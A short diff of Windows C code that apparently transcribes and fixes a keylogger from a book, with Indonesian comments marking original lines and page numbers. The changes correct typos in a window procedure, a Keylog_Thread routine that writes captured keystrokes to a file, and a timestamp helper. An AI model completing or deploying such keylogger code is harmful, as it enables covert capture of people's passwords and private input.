@@ -105,7 +105,9 @@ LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
             break;
         }
        default:
-          return DefWindowProc (hwnd, messagem wParam, lParam);
+       	  // ini aslinya
+          //return DefWindowProc (hwnd, messagem wParam, lParam);
+          return DefWindowProc (hwnd, message, wParam, lParam);
     }
    // ini aslinya belum disalin
    return 0;
@@ -160,7 +162,9 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
                         switch(character)
                         {
                         case VK_SPACE:
-                            fputs(' ',file);
+                        	// ini aslinya
+                            //fputs(' ',file);
+                            fputc(' ',file);
                             fclose(file);
                             break;
                         case VK_SHIFT:
@@ -289,7 +293,9 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
 }
 
 // halaman 46
-char* DateTime_Now(viod)
+// ini aslinya
+//char* DateTime_Now(viod)
+char* DateTime_Now(void)
 {
     time_t now;
     tm *tm;
